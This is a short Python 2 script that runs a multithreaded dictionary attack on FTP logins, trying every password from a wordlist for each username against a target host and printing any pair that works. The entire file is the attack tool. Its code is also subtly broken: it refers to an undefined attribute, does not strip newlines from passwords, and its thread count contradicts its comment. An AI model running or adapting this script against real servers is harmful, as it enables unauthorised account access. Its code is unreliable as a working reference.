#!/usr/bin/env python
#encoding: utf-8
#code by zer0cloud

import Queue
import time
from ftplib import FTP
from threading import Thread

class ftpguess(Thread):
	def __init__(self, name, host):
		Thread.__init__(self)
		self.host = host
		self.name_list = name

	def run(self):
		while True:
			if self.name_list.empty():
				break
			username = self.name_list.get()
			for passwd in open('dict/passwd'):
				ftp = FTP(self.host)
				try:
					print "%s:%s" % (username,passwd)
					if ftp.login(username,passwd):
						print "Yeah! username is %s and passwd is %s" % (self.username,passwd)
						return
					ftp.quit()
				except:
					pass

def ftp_guess(host):
	jobs = Queue.Queue(0)
	for username in open('dict/username'):
		jobs.put(username.rstrip()) #將文本加入到队列中
	for x in range(5): #创建10个线程
		t = ftpguess(jobs,host).start()
		#time.sleep(2)
	return True
